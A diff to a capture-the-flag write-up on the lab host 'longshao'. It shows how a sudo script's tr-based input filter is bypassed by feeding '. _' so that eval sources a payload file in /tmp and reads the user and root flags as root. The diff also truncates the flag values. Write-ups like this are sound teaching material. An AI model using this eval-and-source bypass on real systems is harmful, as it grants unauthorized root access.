@@ -366,7 +366,7 @@ The script reads one line from standard input, strips all alphanumeric character
 17. The filter was bypassed by leveraging the bash source command (. dot). Since the dot character and underscore character are not in the tr deletion set, the input `. _` survives the filter intact. A payload file was created in /tmp/ with a non-alphanumeric name containing the commands to execute as root:
 
 ```zsh
-baolong@longshao:~$ printf 'export PATH=/bin:/usr/bin:/sbin:/usr/sbin\nid\nwhoami\nhostname\ncat /home/baolong/user.txt /root/root.txt\n' > /tmp/_
+baolong@longshao:/tmp$ printf 'export PATH=/bin:/usr/bin:/sbin:/usr/sbin\nid\nwhoami\nhostname\ncat /home/baolong/user.txt /root/root.txt\n' > /tmp/_
 ```
 
 The file /tmp/_ contained commands to restore the PATH environment variable and then run id, whoami, hostname, and cat to retrieve the flags.
@@ -374,13 +374,13 @@ The file /tmp/_ contained commands to restore the PATH environment variable and 
 18. The a.sh script was executed via sudo, and the bypass payload was provided as input:
 
 ```zsh
-chaojiwudilong@longshao:~$ sudo /usr/local/bin/a.sh
+chaojiwudilong@longshao:/tmp$ sudo /usr/local/bin/a.sh
 . _
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 root
 longshao
-flag{user-3408c2a9ca636da4a40f054eea401fd9}
-flag{root-e0bf0dabcccb7d4519c0ad4b431aff16}
+flag{user-340...}
+flag{root-e0b...}
 ```
 
 The eval of `. _` sourced the file /tmp/_ as root, executing all contained commands with uid=0(root) privileges. Both the user and root flags were retrieved successfully.
